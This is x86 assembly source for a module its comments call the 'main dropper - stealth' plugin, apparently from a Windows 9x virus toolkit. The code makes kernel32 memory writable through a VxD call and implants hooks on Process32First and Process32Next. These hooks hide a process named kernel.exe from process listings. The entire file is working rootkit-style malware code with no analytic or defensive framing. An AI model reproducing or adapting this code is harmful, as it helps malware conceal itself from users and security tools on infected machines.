   ; MAINDST
   ; ~~~~~~~
   ; - main dropper - stealth
   ;   þ hide kernel.exe on Process32First/Process32Next

   ; þ based on Vecna's HIDEPROC utility
   ; þ but, really, such code is in the BO2K sources (process_hop.cpp)

   include                 INCLUDE\consts.inc
   include                 INCLUDE\mz.inc
   include                 INCLUDE\pe.inc
   include                 pentry.inc
   include                 k32man.inc
   include                 util.inc

   include                 plugin.inc
                           PLUGIN_START    MAINDST, W32R3, NON_PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, main
                           hookevent EV_MAINDST_DO_STEALTH, main
                           stc
                           retn

   main:                   call    patch_kernel
                           stc     ; keep event!
                           retn

   patch_kernel:           pusha

                           event   EV_UTIL_IS_W9X
                           jnz     __exit

                           call    get_implant

                           event   EV_K32MAN_GET_KERNEL_BASE
                           mov     eax, [ebx].mz_neptr
                           add     ebx, [ebx+eax].pe_headersize
                           sub     ebx, ecx

                           push    ebx
                           call    deprotect

                           mov     edi, ebx

                           pusha
                           xor     eax, eax
                           cld
                           repz    scasb   ; alredy-check + check there are 0s
                           popa
                           jnz     __exit

                           rep     movsb

                           mov_h   edi, Process32First
                           lea     esi, p32f_orig-IMPLANT[ebx]
                           call    patch

                           mov_h   edi, Process32Next
                           lea     esi, p32n_orig-IMPLANT[ebx]
                           call    patch

   __exit:                 popa
                           retn

   patch:                  event   EV_K32MAN_GET_PROC_ADDRESS
                           xchg    edi, eax

                           mov     [esi+p32f_addr-p32f_orig], edi

                           push    edi
                           call    deprotect

                           call    swap

                           mov     al, 68h
                           stosb
                           lea     eax, [esi+p32f_entry-p32f_orig]
                           stosd
                           mov     al, 0C3h
                           stosb

                           retn

   ; input: address on stack

   deprotect:              pusha
                           mov     ebx, [esp+32+4]
                           shr     ebx, 12
                           push    PC_STATIC+PC_USER+PC_WRITEABLE
                           push    0
                           push    1
                           push    ebx
                           push    0001000Dh       ;_PageModifyPermissions
                           event   EV_K32MAN_GET_VXDCALL0
                           call    eax
                           popa
                           retn    4

   ; output: ESI/ECX

   get_implant:            call    pop_esi
   IMPLANT:

   p32f_entry:             pusha
                           call    $+5+8
   p32f_orig               dd      ?,?
                           pop     esi
                           db      0BFh    ; mov edi, xxxxxxxx
   p32f_addr               dd      ?
                           call    swap
                           push    dword ptr [esp+32+8]
                           push    dword ptr [esp+32+8]
                           call    edi
                           mov     [esp].popa_eax, eax
                           call    swap
                           or      eax, eax
                           jz      __exit
                           call    check_name
                           jne     __exit
                           push    dword ptr [esp+32+8]
                           push    dword ptr [esp+32+8]
                           call    dword ptr [esi+p32n_addr-p32f_orig]
   __exit:                 popa
                           retn    8

   p32n_entry:             pusha
                           call    $+5+8
   p32n_orig               dd      ?,?
                           pop     esi
                           db      0BFh    ; mov edi, xxxxxxxx
   p32n_addr               dd      ?
   __retry:                call    swap
                           push    dword ptr [esp+32+8]
                           push    dword ptr [esp+32+8]
                           call    edi
                           mov     [esp].popa_eax, eax
                           call    swap
                           or      eax, eax
                           jz      __exit
                           call    check_name
                           je      __retry
   __exit:                 popa
                           retn    8

   ; swap QWORDs at ESI/EDI

   swap:                   push    [esi].dword ptr 0       ; 21 byte
                           push    [esi].dword ptr 4
                           push    [edi].dword ptr 0
                           push    [edi].dword ptr 4
                           pop     [esi].dword ptr 4
                           pop     [esi].dword ptr 0
                           pop     [edi].dword ptr 4
                           pop     [edi].dword ptr 0
                           retn

   check_name:             pusha
                           mov     esi, [esp+32+4+32+8]
                           add     esi, p32e_szExeFile    ; see MAINDST.INC
   __scan:                 mov     al, [esi]
                           inc     esi
                           or      al, al
                           jnz     __scan
                           ; kernel.exe0
                           mov     eax, [esi-15]
                           xor     eax, [esi-15+4]
                           or      eax, 20202020h
                           neg     eax
                           cmp     eax, -'nrek'
                           popa
                           ret

   IMPLANT_SIZE            equ     $-IMPLANT

   pop_esi:                pop     esi
                           mov     ecx, IMPLANT_SIZE

                           retn    ; get_implant

                           PLUGIN_END
